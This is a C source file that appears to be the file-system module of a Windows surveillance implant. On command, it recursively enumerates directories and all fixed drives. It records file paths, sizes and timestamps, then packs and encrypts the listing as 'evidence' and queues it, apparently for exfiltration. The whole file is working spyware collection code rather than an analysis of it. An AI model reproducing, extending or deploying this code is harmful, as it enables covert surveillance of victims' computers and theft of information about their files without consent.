#include <Windows.h>
#include <stdio.h>
#include "proto.h"
#include "zmem.h"
#include "filesystem.h"
#include "globals.h"

FILESYSTEM_LOGS lpFileSystemLogs[MAX_FILESYSTEM_QUEUE];

BOOL QueueFileSystemLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	if (!lpEvBuff || !dwEvSize)
		return FALSE;

	for (DWORD i=0; i<MAX_FILESYSTEM_QUEUE; i++)
	{
		if (lpFileSystemLogs[i].dwSize == 0 || lpFileSystemLogs[i].lpBuffer == NULL)
		{
			lpFileSystemLogs[i].dwSize = dwEvSize;
			lpFileSystemLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}


WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path)
{
	_snwprintf_s(recurse_path, MAX_PATH, _TRUNCATE, L"%s\\*", start_path);	
	return recurse_path;
}

WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_path)
{
	WCHAR *term;

	_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s", start_path);	
	if ( (term = wcsrchr(dest_path, L'\\')) ) {
		term++;
		*term = NULL;
		_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s%s", dest_path, file_name);	
	} 
		
	return dest_path;
}


BOOL ExploreDirectory(LPBYTE *lpBuffer, LPDWORD dwBuffSize, LPWSTR strStartPath, DWORD dwDepth)
{
	WCHAR file_path[MAX_PATH], recurse_path[MAX_PATH];
	directory_header_struct directory_header;

	if (strStartPath == NULL)
		return FALSE;
	if (dwDepth == 0)
		return TRUE;

	if (!wcscmp(strStartPath, L"/"))
	{
		WCHAR strDriveLetter[3];
		strDriveLetter[1] = L':';
		strDriveLetter[2] = L'\0';

		for (strDriveLetter[0] = L'A'; strDriveLetter[0] <= L'Z'; strDriveLetter[0]++)
		{
			if (GetDriveType(strDriveLetter) == DRIVE_FIXED)
			{
				SecureZeroMemory(&directory_header, sizeof(directory_header_struct));

				directory_header.version = DIR_EXP_VERSION;
				directory_header.flags |= PATH_IS_DIRECTORY;
				directory_header.path_len = wcslen(strDriveLetter)*2;

				if (!ExploreDirectory(lpBuffer, dwBuffSize, RecurseDirectory(strDriveLetter, recurse_path), dwDepth - 1))
					directory_header.flags |= PATH_IS_EMPTY;

				if (!*lpBuffer)
					*lpBuffer = (LPBYTE) zalloc(sizeof(directory_header_struct) + directory_header.path_len);
				else
					*lpBuffer = (LPBYTE) realloc(*lpBuffer, *dwBuffSize + sizeof(directory_header_struct) + directory_header.path_len);

				memcpy(*lpBuffer + *dwBuffSize, &directory_header, sizeof(directory_header_struct));
				memcpy(*lpBuffer + *dwBuffSize + sizeof(directory_header_struct), strDriveLetter, directory_header.path_len);
				*dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;

				//dwBuffSize = sizeof(directory_header_struct) + directory_header.path_len;
				//dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;

				/*
				LPBYTE lpBuff = (LPBYTE) zalloc(sizeof(directory_header_struct) + directory_header.path_len);
				memcpy(lpBuff, &directory_header, sizeof(directory_header_struct));
				memcpy(lpBuff + sizeof(directory_header_struct), strDriveLetter, directory_header.path_len);

				// SCRIVI LOG
				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(sizeof(directory_header_struct) + directory_header.path_len, lpBuff, PM_EXPLOREDIR, NULL, 0, &dwEvSize);
				zfree(lpBuff);
				if (!QueueFileSystemLog(lpEvBuffer, dwEvSize))
					zfree(lpEvBuffer);
				*/
			}
		}
		return TRUE;
	}

	BOOL bIsFull = FALSE;
	WIN32_FIND_DATA pFindData;
	HANDLE hFind = FindFirstFile(strStartPath, &pFindData);
	if (hFind == INVALID_HANDLE_VALUE)
		return FALSE;

	do
	{
		if (!wcscmp(pFindData.cFileName, L".") || !wcscmp(pFindData.cFileName, L".."))
			continue;

		bIsFull = TRUE;
		SecureZeroMemory(&directory_header, sizeof(directory_header_struct));
		directory_header.version = DIR_EXP_VERSION;
		directory_header.file_size_hi = pFindData.nFileSizeHigh;
		directory_header.file_size_lo = pFindData.nFileSizeLow;
		directory_header.last_write = pFindData.ftLastWriteTime;

		if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			directory_header.flags |= PATH_IS_DIRECTORY;
		CompleteDirectoryPath(strStartPath, pFindData.cFileName, file_path);
		directory_header.path_len = wcslen(file_path)*2;

		if (directory_header.flags & PATH_IS_DIRECTORY)
			if (!ExploreDirectory(lpBuffer, dwBuffSize, RecurseDirectory(file_path, recurse_path), dwDepth-1))
				directory_header.flags |= PATH_IS_EMPTY;

		if (!*lpBuffer)
			*lpBuffer = (LPBYTE) zalloc(sizeof(directory_header_struct) + directory_header.path_len);
		else
			*lpBuffer = (LPBYTE) realloc(*lpBuffer, *dwBuffSize + sizeof(directory_header_struct) + directory_header.path_len);

		//dwBuffSize = sizeof(directory_header_struct) + directory_header.path_len;
		//dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;
		memcpy(*lpBuffer + *dwBuffSize, &directory_header, sizeof(directory_header_struct));
		memcpy(*lpBuffer + *dwBuffSize + sizeof(directory_header_struct), file_path, directory_header.path_len);
		*dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;

		/*
		LPBYTE lpBuff = (LPBYTE) zalloc(sizeof(directory_header_struct) + directory_header.path_len);
		memcpy(lpBuff, &directory_header, sizeof(directory_header_struct));
		memcpy(lpBuff + sizeof(directory_header_struct), file_path, directory_header.path_len);

		// SCRIVI LOG
		DWORD dwEvSize;
		LPBYTE lpEvBuffer = PackEncryptEvidence(sizeof(directory_header_struct) + directory_header.path_len, lpBuff, PM_EXPLOREDIR, NULL, 0, &dwEvSize);
		zfree(lpBuff);
		if (!QueueFileSystemLog(lpEvBuffer, dwEvSize))
			zfree(lpEvBuffer);
		*/
	}
	while (FindNextFile(hFind, &pFindData));

	FindClose(hFind);

	return bIsFull;
}


BOOL FileSystemHandler(DWORD dwMsgLen, DWORD dwNumDir, LPBYTE lpDirBuffer)
{
	if (!bCollectEvidences)
		return FALSE;

	for (DWORD i=0; i<dwNumDir; i++)
	{
		WCHAR strExpandedDir[MAX_PATH+1];
		DWORD dwDepth = lpDirBuffer[0];
		DWORD dwDirLen = *(LPDWORD) &lpDirBuffer[4];

		if (ExpandEnvironmentStrings((LPWSTR)&lpDirBuffer[8], strExpandedDir, MAX_PATH))
		{
			DWORD dwBuffSize = 0;
			LPBYTE lpBuffer = NULL;
			ExploreDirectory(&lpBuffer, &dwBuffSize, strExpandedDir, dwDepth);

			DWORD dwEvSize;
			LPBYTE lpEvBuffer = PackEncryptEvidence(dwBuffSize, lpBuffer, PM_EXPLOREDIR, NULL, 0, &dwEvSize);
			zfree(lpBuffer);
			
			if (!QueueFileSystemLog(lpEvBuffer, dwEvSize))
				zfree(lpEvBuffer);
		}
#ifdef _DEBUG
		else
		{
			DWORD err = GetLastError();
			__asm nop;
		}
#endif

		lpDirBuffer += sizeof(DWORD); // dwDepth
		lpDirBuffer += sizeof(DWORD); // dwDirLen
		lpDirBuffer += dwDirLen;
	}

	return TRUE;
}


